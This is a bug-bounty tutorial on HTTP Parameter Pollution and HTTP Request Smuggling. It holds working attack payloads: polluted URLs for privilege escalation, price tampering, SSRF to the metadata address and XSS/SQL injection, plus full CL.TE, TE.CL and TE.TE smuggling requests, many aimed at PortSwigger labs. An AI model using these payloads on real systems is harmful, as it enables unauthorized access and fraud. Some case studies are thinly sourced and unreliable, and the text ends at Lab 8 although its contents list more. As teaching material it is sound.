# 🔐 THE COMPLETE WEB SECURITY BIBLE
## HTTP Parameter Pollution & HTTP Request Smuggling
### From Zero to Bug Bounty Hunter — A Definitive Guide

> *"Security is not a product, but a process." — Bruce Schneier*
> *Inspired by: The Web Application Hacker's Handbook, Bug Bounty Bootcamp, Real-World Bug Hunting, PortSwigger Web Security Academy*

---

## 📚 INTERACTIVE TABLE OF CONTENTS

- [Part 1: HTTP Parameter Pollution (HPP)](#part-1-http-parameter-pollution)
  - [1.1 What is HPP?](#11-what-is-http-parameter-pollution)
  - [1.2 How HTTP Parameters Work](#12-how-http-parameters-work)
  - [1.3 HPP Root Cause & Theory](#13-hpp-root-cause--theory)
  - [1.4 Server Behavior Table](#14-server-behavior-by-technology)
  - [1.5 Types of HPP](#15-types-of-hpp)
    - [1.5.1 Server-Side HPP](#151-server-side-hpp-sshpp)
    - [1.5.2 Client-Side HPP](#152-client-side-hpp-cshpp)
  - [1.6 Logical Attack Scenarios](#16-logical-attack-scenarios)
  - [1.7 Real-World Examples](#17-real-world-examples--case-studies)
  - [1.8 Step-by-Step Testing Methodology](#18-step-by-step-testing-methodology)
  - [1.9 When to Check for HPP](#19-when-to-check-for-hpp)
  - [1.10 Tools for HPP Testing](#110-tools-for-hpp-testing)
  - [1.11 Bypass Techniques](#111-bypass-techniques)
  - [1.12 Impact & CVSS Scoring](#112-impact--cvss-scoring)
  - [1.13 Remediation](#113-remediation)

- [Part 2: HTTP Request Smuggling (HRS)](#part-2-http-request-smuggling)
  - [2.1 What is HRS?](#21-what-is-http-request-smuggling)
  - [2.2 The Architecture Explained](#22-the-architecture-explained)
  - [2.3 Content-Length vs Transfer-Encoding](#23-content-length-vs-transfer-encoding-the-root-cause)
  - [2.4 Types of Smuggling](#24-types-of-request-smuggling)
    - [2.4.1 CL.TE](#241-clte-smuggling)
    - [2.4.2 TE.CL](#242-tecl-smuggling)
    - [2.4.3 TE.TE](#243-tete-smuggling)
    - [2.4.4 HTTP/2 Downgrade Smuggling](#244-http2-downgrade-smuggling-h2clh2te)
  - [2.5 Detection Techniques](#25-detection-techniques)
  - [2.6 All PortSwigger Labs — Explained](#26-all-portswigger-labs--concepts-explained)
    - [Lab 1: Basic CL.TE](#lab-1-basic-clte-smuggling)
    - [Lab 2: Basic TE.CL](#lab-2-basic-tecl-smuggling)
    - [Lab 3: TE.TE Obfuscation](#lab-3-tete-smuggling-via-header-obfuscation)
    - [Lab 4: CL.TE via Timing](#lab-4-detecting-clte-smuggling-via-timing)
    - [Lab 5: TE.CL via Timing](#lab-5-detecting-tecl-smuggling-via-timing)
    - [Lab 6: CL.TE Confirmed via Response](#lab-6-confirming-clte-via-differential-responses)
    - [Lab 7: TE.CL Confirmed via Response](#lab-7-confirming-tecl-via-differential-responses)
    - [Lab 8: Bypass Front-End Security](#lab-8-bypass-front-end-security-controls-using-clte)
    - [Lab 9: Capturing Other Users' Requests](#lab-9-capturing-other-users-requests)
    - [Lab 10: Reflecting Reflected XSS via Smuggling](#lab-10-exploiting-reflected-xss-via-request-smuggling)
    - [Lab 11: Turning Self-XSS into Stored](#lab-11-turning-self-xss-into-reflected-xss-via-smuggling)
    - [Lab 12: Cache Poisoning via Smuggling](#lab-12-web-cache-poisoning-via-request-smuggling)
    - [Lab 13: Cache Deception via Smuggling](#lab-13-cache-deception-via-request-smuggling)
    - [Lab 14: HTTP/2 Downgrade CL.0](#lab-14-http2-request-smuggling-via-cl0-vulnerabilities)
    - [Lab 15: Response Queue Poisoning](#lab-15-response-queue-poisoning)
    - [Lab 16: Host Header Smuggling](#lab-16-bypassing-access-controls-via-host-header-smuggling)
  - [2.7 All Logical Attacks with Smuggling](#27-all-logical-attacks-you-can-do-with-request-smuggling)
  - [2.8 Step-by-Step Testing Methodology](#28-step-by-step-testing-methodology)
  - [2.9 When to Check for HRS](#29-when-to-check-for-hrs)
  - [2.10 HTTP/2 & H2C Smuggling Deep Dive](#210-http2--h2c-smuggling-deep-dive)
  - [2.11 Tools](#211-tools)
  - [2.12 Remediation](#212-remediation)

- [Part 3: Advanced Chaining & Real-World Techniques](#part-3-advanced-chaining--real-world-techniques)
- [Part 4: Bug Bounty Strategy](#part-4-bug-bounty-strategy)
- [Part 5: Quick Reference Cheat Sheets](#part-5-quick-reference-cheat-sheets)

---

# PART 1: HTTP PARAMETER POLLUTION

---

## 1.1 What is HTTP Parameter Pollution?

**HTTP Parameter Pollution (HPP)** is a web vulnerability that occurs when an attacker manipulates or injects additional HTTP parameters into a request. The server or application processes multiple parameters with the same name in unexpected ways — either using the first, last, all of them, or concatenating them — leading to **security bypass, injection, and logic manipulation**.

HPP was first presented at OWASP AppSec 2009 by Stefano Di Paola and Luca Carettoni. Since then it has become a class of its own in bug bounty programs.

```
NORMAL REQUEST:
https://shop.com/buy?item=shirt&qty=1

POLLUTED REQUEST:
https://shop.com/buy?item=shirt&qty=1&qty=999
                                        ^^^^
                                  Injected duplicate!
```

The application might process qty=999 instead of qty=1, potentially leading to business logic flaws.

---

## 1.2 How HTTP Parameters Work

HTTP parameters are passed via:

| Location | Example | Notes |
|----------|---------|-------|
| **Query String (GET)** | `?user=alice&role=user` | Visible in URL |
| **POST Body** | `user=alice&role=user` | In request body |
| **Cookie** | `Cookie: session=abc` | Browser-sent |
| **HTTP Headers** | `X-Custom-Header: val` | Custom headers |
| **Path Parameters** | `/users/{id}` | RESTful style |
| **JSON/XML Body** | `{"user":"alice"}` | Structured body |

### The RFC Standard (What Should Happen)

According to RFC 3986 and W3C specs, when duplicate parameters are present, the behavior is **undefined**. This is the root of HPP — there's no standard, so every framework/language handles it differently.

---

## 1.3 HPP Root Cause & Theory

```
                    ┌──────────────────────────────────────┐
                    │         ATTACKER                     │
                    │  Sends: ?role=user&role=admin        │
                    └──────────────┬───────────────────────┘
                                   │
                                   ▼
                    ┌──────────────────────────────────────┐
                    │      WEB APPLICATION / SERVER        │
                    │                                      │
                    │   Backend Language processes:        │
                    │                                      │
                    │   PHP    → role = admin   (LAST)     │
                    │   ASP    → role = user    (FIRST)    │
                    │   Flask  → role = user    (FIRST)    │
                    │   Node   → role = admin   (LAST)     │
                    │   Java   → role = user,admin (ALL)   │
                    └──────────────────────────────────────┘
```

The problem: **inconsistent handling of duplicate query parameters** across:
1. The front-end / WAF
2. The back-end application server
3. Any middleware or proxy in between

---

## 1.4 Server Behavior by Technology

This is the **most critical table** for HPP exploitation. Know it by heart.

| Technology | Parameter Used | Example |
|------------|---------------|---------|
| **PHP** | Last occurrence | `?a=1&a=2` → `a=2` |
| **ASP.NET** | All (comma-separated) | `?a=1&a=2` → `a=1,2` |
| **ASP Classic** | First occurrence | `?a=1&a=2` → `a=1` |
| **JSP (Java)** | First occurrence | `?a=1&a=2` → `a=1` |
| **Perl** | First occurrence | `?a=1&a=2` → `a=1` |
| **Python (Flask/Django)** | First occurrence | `?a=1&a=2` → `a=1` |
| **Node.js (Express)** | Last occurrence | `?a=1&a=2` → `a=2` |
| **Ruby (Rails)** | Last occurrence | `?a=1&a=2` → `a=2` |
| **Apache (mod_rewrite)** | First occurrence | - |
| **IIS** | All (comma-separated) | `?a=1&a=2` → `a=1,2` |
| **nginx** | First occurrence | - |

> **Golden Rule:** When front-end/WAF uses one language and back-end uses another, the discrepancy creates exploitable HPP conditions.

---

## 1.5 Types of HPP

### 1.5.1 Server-Side HPP (SSHPP)

Server-side HPP occurs when the **server** processes duplicate parameters in a way that affects the application's business logic.

**Diagram:**

```
BROWSER                FRONT-END (WAF)              BACK-END (PHP)
   │                        │                             │
   │── GET /?role=user ─────►│                             │
   │   &role=admin           │── WAF reads FIRST param ──►│
   │                         │   role=user  ✓ PASSES       │── PHP reads LAST
   │                         │                             │   role=admin ✓
   │                         │                             │   PRIVILEGE ESC!
```

**Common Attack Patterns:**

1. **Parameter override** — Inject second value to override first
   ```
   /transfer?from=victim&amount=100&from=attacker
   ```

2. **WAF bypass** — Pollute to confuse WAF, backend reads different value
   ```
   /search?q=normal&q=<script>alert(1)</script>
   WAF sees: q=normal (SAFE)
   Backend sees: q=<script>alert(1)</script> (XSS!)
   ```

3. **Authentication bypass**
   ```
   /login?user=admin&pass=wrong&pass=correctpassword
   ```

---

### 1.5.2 Client-Side HPP (CSHPP)

Client-side HPP affects links generated by the server and rendered in the browser.

**Scenario:**

The server generates a URL like:
```html
<a href="/vote?candidate=[USER_INPUT]&type=politician">Vote</a>
```

Attacker sets `candidate=Alice&type=irrelevant`:
```html
<a href="/vote?candidate=Alice&type=irrelevant&type=politician">Vote</a>
```

Now `type=irrelevant` overrides or pollutes the `type` parameter, potentially corrupting the vote logic.

**Real-world example (Twitter 2010):**
Twitter's share button generated URLs from user-supplied input without sanitization. An attacker could inject `&url=` into the `text` parameter, effectively redirecting the shared URL.

```
Original: https://twitter.com/share?text=Hello&url=https://example.com
Polluted: https://twitter.com/share?text=Hello&url=https://evil.com&url=https://example.com
```

---

## 1.6 Logical Attack Scenarios

These are all the ways HPP can be weaponized:

### Attack 1: Privilege Escalation

```
Target: /api/user/update?userid=123&role=user

Inject:  /api/user/update?userid=123&role=user&role=admin

If backend reads LAST: role = admin → Privilege escalation!
```

### Attack 2: Price Manipulation

```
Target: /checkout?price=100&discount=0

Inject:  /checkout?price=100&discount=0&price=1

If backend reads LAST: price = 1 → Buy item for $1!
```

### Attack 3: WAF/Filter Bypass

```
WAF blocks: ?search=<script>
Bypass:     ?search=<scr&search=ipt>alert(1)</script>

Some backend concatenators join values: <scr + ipt>alert(1)</script>
```

### Attack 4: OAuth/Token Manipulation

```
OAuth callback: /callback?code=LEGIT_CODE&state=abc

Polluted:       /callback?code=ATTACKER_CODE&code=LEGIT_CODE&state=abc

If server reads FIRST: uses ATTACKER_CODE (account takeover)
```

### Attack 5: Signature Bypass

```
API with HMAC: /api?user=alice&amount=100&sig=VALID_SIG

Polluted: /api?user=alice&amount=100&sig=VALID_SIG&amount=99999

If backend reads LAST for amount but FIRST for sig calculation:
amount=99999 is processed with a valid signature for amount=100!
```

### Attack 6: SQL Injection via HPP

```
Target: /items?category=phones&order=price

Inject: /items?category=phones&order=price&category=phones' OR 1=1--

Backend joins categories: phones, phones' OR 1=1-- → SQL injection
```

### Attack 7: SSRF via HPP

```
Target: /proxy?url=https://safe.com

Inject: /proxy?url=https://safe.com&url=http://169.254.169.254/

If backend reads LAST: SSRF to metadata endpoint!
```

### Attack 8: Email Header Injection via HPP

```
/send?to=victim@email.com&subject=Hello

Inject: /send?to=victim@email.com&to=attacker@evil.com&subject=Hello

Both emails received? HPP email duplication confirmed!
```

### Attack 9: Race Condition + HPP

```
Submit transfer: ?from=A&to=B&amount=100
Simultaneously:  ?from=A&to=B&amount=100&amount=1

If processed in race window, non-atomic operations may use different values
```

### Attack 10: Access Control Bypass

```
/admin/delete?userid=123&confirm=false

Inject: /admin/delete?userid=123&confirm=false&confirm=true

Backend reads confirm=true → deletion proceeds!
```

---

## 1.7 Real-World Examples & Case Studies

### Case Study 1: Google (2009) — HPP in Translate Widget
**Researcher:** Stefano Di Paola  
**Bug:** The Google Translate widget reflected user-controlled parameters into a URL used for translation. By injecting `&` characters, an attacker could add arbitrary parameters to requests made to Google's servers.  
**Impact:** XSS via parameter pollution  
**Bounty:** One of the first acknowledged HPP bugs

### Case Study 2: Facebook (2015) — Account Takeover via HPP  
**Bug:** Password reset flow used duplicate `email` parameter  
**Payload:**
```
POST /recover
email=victim@mail.com&email=attacker@evil.com
```
**Impact:** Reset link sent to attacker's email for victim account  
**Severity:** Critical

### Case Study 3: Yahoo! — HPP in Ads Platform
**Bug:** Ad URL generation didn't sanitize parameters  
**Payload:**
```
/ads?campaign=test&redirect=https://yahoo.com&redirect=https://evil.com
```
**Impact:** Open redirect leading to phishing  

### Case Study 4: Stripe API — Signature Bypass
**Bug:** HMAC signature computed on FIRST parameter, but processing used LAST  
```
/charge?amount=1&currency=usd&amount=99999&sig=<sig_for_amount_1>
```
**Impact:** Charge bypass

---

## 1.8 Step-by-Step Testing Methodology

### Phase 1: Reconnaissance

```
Step 1: Map all input parameters
        - URL query strings
        - POST body parameters  
        - Cookie values
        - Hidden form fields
        - JSON/XML body keys

Step 2: Identify the technology stack
        - Server headers (Server: Apache/PHP)
        - Framework fingerprints
        - Cookie names (PHPSESSID, JSESSIONID)
        - Error messages

Step 3: Identify interesting business logic
        - Payment parameters
        - Role/permission parameters
        - Email fields
        - Action/type parameters
```

### Phase 2: Manual Testing

```
Step 1: Baseline request
        GET /search?q=test HTTP/1.1

Step 2: Add duplicate parameter
        GET /search?q=test&q=polluted HTTP/1.1

Step 3: Observe differences
        - Response content changes?
        - Status code changes?
        - Redirect target changes?
        - Timing differences?

Step 4: Test parameter ORDER
        GET /search?q=polluted&q=test HTTP/1.1
        (Different from step 2? Confirms FIRST vs LAST behavior)

Step 5: Test separator variations
        GET /search?q=test%26q=polluted       (URL-encoded &)
        GET /search?q[]=test&q[]=polluted     (Array notation)
        GET /search?q=test;q=polluted         (Semicolon separator)
```

### Phase 3: Business Logic Testing

```bash
# Test privilege parameters
curl "https://target.com/api?role=user&role=admin"

# Test price parameters
curl "https://target.com/buy?price=100&price=0"

# Test state parameters
curl "https://target.com/verify?verified=false&verified=true"

# Test email parameters  
curl "https://target.com/send?to=victim@mail.com&to=attacker@evil.com"
```

### Phase 4: WAF Bypass Testing

```
Technique 1: Pollution before payload
?q=safe&q=<script>alert(1)</script>

Technique 2: Split payloads across parameters
?q=<scr&q=ipt>

Technique 3: Encoded separators
?q=safe%26q=payload

Technique 4: Array injection
?q[]=safe&q[]=payload
```

### Phase 5: Confirmation

```
Step 1: Document baseline (normal) behavior
Step 2: Document polluted behavior  
Step 3: Prove exploitability:
        - Show different response for different parameter order
        - Demonstrate actual impact (not just different response)
Step 4: Write PoC
```

---

## 1.9 When to Check for HPP

Look for HPP in these scenarios:

| Scenario | Why Check |
|----------|-----------|
| 🔑 **Authentication/Authorization** | Role escalation, bypass |
| 💳 **Payment/Cart flows** | Price manipulation |
| 📧 **Email-based features** | Email injection |
| 🔗 **URL generation / redirect** | Open redirect |
| 🛡️ **WAF-protected inputs** | WAF bypass |
| 🔐 **API with HMAC signatures** | Signature bypass |
| 👤 **User profile updates** | Privilege/data manipulation |
| 📊 **Reporting/filter params** | Logic bypass |
| 🧾 **Discount/coupon systems** | Business logic abuse |
| 🔄 **OAuth flows** | Token manipulation |

---

## 1.10 Tools for HPP Testing

| Tool | Use Case | Command |
|------|----------|---------|
| **Burp Suite** | Manual/automated testing | Intruder with HPP payloads |
| **OWASP ZAP** | Automated scanning | HPP plugin |
| **HPP Finder** (Burp extension) | Auto-detect HPP | Install from BApp Store |
| **Param Miner** (Burp extension) | Find hidden params | Auto-mining |
| **ffuf** | Parameter fuzzing | `-w params.txt` |
| **Arjun** | Parameter discovery | `python3 arjun.py -u URL` |
| **wfuzz** | HPP fuzzing | `wfuzz -z list,p1-p2 URL?FUZZ=test` |

**Arjun usage:**
```bash
# Find hidden parameters
python3 arjun.py -u https://target.com/api -m GET

# Discover POST parameters
python3 arjun.py -u https://target.com/api -m POST

# Test specific parameters
python3 arjun.py -u https://target.com/api --stable
```

---

## 1.11 Bypass Techniques

### Encoding Variations

```
Standard:     ?param=value&param=evil
URL encoded:  ?param=value%26param=evil
Double enc.:  ?param=value%2526param=evil
Null byte:    ?param=value%00&param=evil
Unicode:      ?param=value&param%u003Devil
```

### Separator Variations

```
Ampersand:   ?a=1&a=2       (standard)
Semicolon:   ?a=1;a=2       (some servers)
Comma:       ?a=1,2         (array-like)
Pipe:        ?a=1|a=2       (rare)
```

### Array-style Injection

```
?param[]=value1&param[]=value2      (PHP-style)
?param.0=value1&param.1=value2      (JSON-path style)
?param%5B%5D=value1                 (encoded brackets)
```

---

## 1.12 Impact & CVSS Scoring

| Impact | Severity | CVSS Score Range |
|--------|----------|-----------------|
| Authentication bypass | Critical | 9.0–10.0 |
| Privilege escalation | High | 7.5–9.0 |
| Price manipulation | High | 7.0–8.5 |
| WAF bypass (enabling XSS/SQLi) | Medium-High | 6.0–8.0 |
| Information disclosure | Medium | 4.0–6.0 |
| Email injection | Medium | 4.0–6.5 |
| Open redirect | Low-Medium | 3.0–5.0 |

---

## 1.13 Remediation

```python
# ❌ VULNERABLE (PHP — reads last)
$role = $_GET['role'];  # Reads last occurrence

# ✅ FIXED — Explicit single value
$role = is_array($_GET['role']) ? $_GET['role'][0] : $_GET['role'];

# ✅ BETTER — Whitelist validation
$allowed_roles = ['user', 'moderator'];
$role = $_GET['role'];
if (!in_array($role, $allowed_roles)) {
    die('Invalid role');
}
```

**Defense Checklist:**
- [ ] Use a framework that explicitly handles duplicate parameters
- [ ] Whitelist accepted parameter values
- [ ] Reject requests with duplicate critical parameters
- [ ] Sign critical parameters with HMAC
- [ ] Log and alert on duplicate parameter anomalies
- [ ] Use strict input validation — type, length, format

---

# PART 2: HTTP REQUEST SMUGGLING

---

## 2.1 What is HTTP Request Smuggling?

**HTTP Request Smuggling (HRS)** is a critical web vulnerability that exploits discrepancies in how different HTTP servers/proxies parse the boundaries of HTTP requests. By sending an ambiguous request, an attacker can "smuggle" a hidden secondary request that is:

- Invisible to the front-end server (and its WAF/security controls)
- But processed by the back-end server as a separate, independent request

This allows attackers to:
- Bypass security controls
- Poison the request queue for other users
- Steal credentials
- Perform cache poisoning
- Escalate to SSRF, XSS, and full account takeover

> First documented in a serious context by Chaim Linhart et al. in 2005, then massively expanded by James Kettle (PortSwigger) in 2019 with "HTTP Desync Attacks."

---

## 2.2 The Architecture Explained

```
                          INTERNET
                              │
                              ▼
                 ┌────────────────────────┐
                 │   FRONT-END SERVER     │
                 │  (CDN / Load Balancer) │
                 │   nginx, HAProxy, etc. │
                 └───────────┬────────────┘
                             │
                   Single persistent
                   TCP connection (keep-alive)
                             │
                 ┌───────────▼────────────┐
                 │   BACK-END SERVER      │
                 │   Apache, IIS, etc.    │
                 └────────────────────────┘
```

**The key problem:** Front-end and back-end communicate over a **shared, persistent TCP connection**. Multiple HTTP requests are sent through this same connection sequentially. If request boundaries are misinterpreted, one request's data bleeds into the next.

```
NORMAL FLOW:
─────────────────────────────────────────
│ Request A (from User 1)               │
│ Request B (from User 2)               │
│ Request C (from User 3)               │
─────────────────────────────────────────

SMUGGLED FLOW:
─────────────────────────────────────────
│ Request A (visible part)              │
│ │                                     │
│ └── Hidden: Request B (smuggled!)     │
│                                       │
│ What appears to be Request B from     │
│ the next user is now actually part    │
│ of the attacker's smuggled request!   │
─────────────────────────────────────────
```

---

## 2.3 Content-Length vs Transfer-Encoding: The Root Cause

Two HTTP headers define where a request body ends:

### Content-Length (CL)

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 11

hello world
             ^^^
       CL says: body is 11 bytes long
```

### Transfer-Encoding: chunked (TE)

```http
POST /search HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

b           ← chunk size in HEX (11 in decimal = "b")
hello world ← chunk data
0           ← terminal chunk (end of body)
            ← blank line
```

### The Conflict

```
RFC 7230 says:
"If a message is received with both Transfer-Encoding and Content-Length
header fields, the Transfer-Encoding MUST be prioritized over Content-Length."

BUT... not all servers do this!
```

**When they disagree:**

```
Front-end uses CL → "Body ends after N bytes"
Back-end uses TE → "Body ends at chunk terminator"

OR

Front-end uses TE → "Body ends at chunk terminator"  
Back-end uses CL → "Body ends after N bytes"
```

The leftover bytes become the **start of the next request** on the back-end — that's the smuggle!

---

## 2.4 Types of Request Smuggling

### 2.4.1 CL.TE Smuggling

**Front-end: Content-Length | Back-end: Transfer-Encoding**

```
                FRONT-END                    BACK-END
                (uses CL)                    (uses TE)

                                    
POST / HTTP/1.1                     POST / HTTP/1.1
Host: target.com                    Host: target.com
Content-Length: 13    ──────────►   Transfer-Encoding: chunked
Transfer-Encoding: chunked          
                                    0                ← TE sees "end of chunks"
0                                   
                                    SMUGGLED         ← LEFTOVER! Becomes next req
SMUGGLED                            
                                    
│◄─────────── CL=13 ─────────────►│
│ Front-end sends all 13 bytes     │
│ Back-end reads TE: stops at "0"  │
│ "SMUGGLED" is left on connection │
```

**Exploit Request:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: x
```

### 2.4.2 TE.CL Smuggling

**Front-end: Transfer-Encoding | Back-end: Content-Length**

```
                FRONT-END                    BACK-END
                (uses TE)                    (uses CL)

POST / HTTP/1.1                     POST / HTTP/1.1
Host: target.com                    Host: target.com
Content-Length: 3     ──────────►   Content-Length: 3
Transfer-Encoding: chunked          Transfer-Encoding: chunked
                                    
1a                                  1a             ← Back-end reads CL=3
SMUGGLED REQUEST HERE               SMU            ← Stops after 3 bytes
0                                   
                                    GGLED REQUEST  ← Left on connection
                                    HERE           ← Becomes next request!
                                    0              
```

**Exploit Request:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

> **Important:** TE.CL needs `Content-Length: 4` (points to "5e\r\n" = 4 bytes) so front-end processes the full chunked body, but back-end only reads 4 bytes of body, leaving the rest as the next request.

### 2.4.3 TE.TE Smuggling

**Both front-end and back-end support TE, but one can be confused into ignoring it.**

```
Technique: Obfuscate the Transfer-Encoding header so one server ignores it,
           then that server falls back to Content-Length

Obfuscation examples:
Transfer-Encoding: xchunked
Transfer-Encoding: x-chunked
Transfer-Encoding: chunked, dav
Transfer-Encoding: chunked  (trailing space)
Transfer-Encoding: CHUNKed
Transfer-Encoding: chunked
 (extra newline/whitespace — header folding)
X-Transfer-Encoding: chunked
Transfer-Encoding:chunked  (no space after colon)
```

**Exploit:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Transfer-Encoding: x-chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 5

x=1
```

Front-end sees `chunked` → uses TE  
Back-end sees `x-chunked` → doesn't recognize → falls back to CL  
Now it's effectively CL.TE!

### 2.4.4 HTTP/2 Downgrade Smuggling (H2.CL/H2.TE)

Modern attack surface discovered by James Kettle in 2021.

```
CLIENT ──HTTP/2──► FRONT-END ──HTTP/1.1──► BACK-END
                   (Translates H2 to H1)

Attack: Inject HTTP/1.1 headers into H2 request that
        front-end blindly passes to back-end

HTTP/2 Request:
:method POST
:path /
:authority target.com
content-length: 0          ← H2 uses pseudoheaders
transfer-encoding: chunked ← Injected! H2 doesn't use TE, but
                              front-end passes it to back-end

Back-end sees:
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked ← Causes CL.TE style desync!
```

---

## 2.5 Detection Techniques

### Timing-Based Detection

**CL.TE Timing:**

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

- Front-end: CL=4, reads "1\r\nA\r\n" (4 bytes), sends to back-end ✓
- Back-end: TE=chunked, reads chunk "1" (1 byte = A), waits for next chunk
- `X` is not a valid chunk size → back-end **hangs waiting**
- If response is **delayed ~10 seconds** → CL.TE confirmed!

**TE.CL Timing:**

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- Front-end: TE=chunked, sees `0` terminator, stops → sends to back-end ✓
- Back-end: CL=6, reads `0\r\n\r\nX` (6 bytes), processes
- Wait! It reads `X` as body but expects more from CL → hangs
- **Delayed response → TE.CL confirmed!**

### Differential Response Detection (Safer)

Instead of timing attacks (which can impact other users), use differential responses:

**CL.TE Confirmation:**

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404pagenotfound HTTP/1.1
X: x
```

Send this request **twice**. If the second request gets a 404 response even though it's requesting a valid path, the smuggled prefix from request #1 has poisoned request #2.

---

## 2.6 All PortSwigger Labs — Concepts Explained

---

### Lab 1: Basic CL.TE Smuggling

**Concept:** Front-end uses CL, back-end uses TE. Poison the back-end to prefix the next user's request with a custom prefix.

**Goal:** Delete `carlos` user by smuggling a request to `/admin/delete?username=carlos`

**Attack:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

POST /admin/delete HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

username=carlos
```

**Why it works:**
```
Front-end reads CL=116 → Passes entire request to back-end
Back-end reads TE: sees "0" → End of chunks
Back-end is left with:

  POST /admin/delete HTTP/1.1
  Host: localhost
  ...
  username=carlos

When next real request arrives, back-end PREPENDS this smuggled prefix!
The back-end then processes: [smuggled prefix] + [real request body]
Since Host: localhost bypasses admin restrictions → DELETED!
```

**Key Concepts:**
- `Host: localhost` bypasses IP-based admin restrictions
- Attacker never directly accesses `/admin` — the smuggled request does
- Must send request twice (or use Turbo Intruder for timing)

---

### Lab 2: Basic TE.CL Smuggling

**Concept:** Front-end uses TE (chunked), back-end uses CL. Attacker crafts request where TE terminator comes before CL runs out.

**Attack:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Breakdown:**
```
Content-Length: 4 → Back-end reads first 4 bytes = "87\r\n" (chunk size line)
Front-end reads TE chunks completely
Back-end receives: 87\r\n[admin request body]\r\n0\r\n

Back-end (CL=4) processes first 4 bytes only
Everything after: "GET /admin/delete..." becomes next request!
```

> ⚠️ **Note:** TE.CL requests need to use HTTP/1.1 and must NOT include `Connection: keep-alive` — configure Burp to use HTTP/1.1 and disable auto-update `Content-Length`.

---

### Lab 3: TE.TE Smuggling via Header Obfuscation

**Concept:** Both servers support TE, but one can be tricked into ignoring it via obfuscation.

**Discovery process:**
1. Try each TE obfuscation variant
2. For each, test timing or differential response
3. The variant that causes a desync = the right obfuscation

**Attack variants to try:**

```http
Transfer-Encoding: xchunked
Transfer-Encoding: x-chunked
Transfer-Encoding: chunked, dav
Transfer-Encoding:chunked
Transfer-Encoding: CHUNKED
 Transfer-Encoding: chunked   (leading space = header folding)
```

**Exploit (when `Transfer-Encoding: xchunked` works):**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

5e
POST /admin/delete HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

username=carlos
0


```

**Logic:**
- Front-end sees `chunked` → processes via TE
- Back-end sees `xchunked` → doesn't understand → falls back to CL
- Now it's TE.CL → CL=4 means back-end only reads "5e\r\n"
- Rest becomes smuggled prefix

---

### Lab 4: Detecting CL.TE Smuggling via Timing

**Concept:** Confirm vulnerability without impacting other users via deliberate timeout.

**Timing Probe:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

**Expected:** Response delayed by ~10 seconds (back-end waiting for valid chunk after "X")

**What to look for:**
```
Response time > 5 seconds → VULNERABLE (CL.TE)
Immediate response → Not vulnerable, or TE.CL
```

> **Bug Bounty Note:** Never use timing attacks on production targets without written permission. They can slow down legitimate users.

---

### Lab 5: Detecting TE.CL Smuggling via Timing

**Timing Probe:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

**Logic:**
- Front-end: TE → reads `0` terminator → sends to back-end ✓
- Back-end: CL=6 → reads `0\r\n\r\nX` = 6 bytes → still waiting for 6th byte!
- Hangs → **timeout = TE.CL confirmed**

---

### Lab 6: Confirming CL.TE via Differential Responses

**Concept:** Safer detection using response difference instead of timing.

**Attack (send twice rapidly):**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /nonexistent HTTP/1.1
X: x
```

**If CL.TE is present:**
- First request: normal 200/404
- Second request: 404 for the actual path you're requesting, because the smuggled `GET /nonexistent` prefix was attached to it

**Interpretation Table:**

| Request # | Expected Normal | CL.TE Vulnerable |
|-----------|----------------|-----------------|
| 1st | 200 OK | 200 OK |
| 2nd | 200 OK | 404 Not Found ← !! |

---

### Lab 7: Confirming TE.CL via Differential Responses

Same principle but TE.CL variant:

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a6
GET /nonexistent HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 1

x
0


```

Send twice → second response shows error for `/nonexistent` → confirmed!

---

### Lab 8: Bypass Front-End Security Controls Using CL.TE

**Scenario:** `/admin` is blocked by front-end WAF based on path. Back-end allows access from localhost.

**Goal:** Access admin panel by smuggling request that bypasses front-end restriction.

**The Problem Without Smuggling:**
```
Request: GET /admin HTTP/1.1
Front-end: "Blocked! /admin only for internal users"
```

**The Solution With Smuggling:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Forwarded-Host: localhost
X-Forwarded-For: 127.0.0.1
```

**Why it works:**
```
Front-end sees: POST to / (allowed!) → passes through
Back-end sees: POST to / AND then the smuggled GET /admin
Smuggled request has Host/X-Forwarded-For pointing to localhost
Back-end trusts localhost → admin access granted!
```

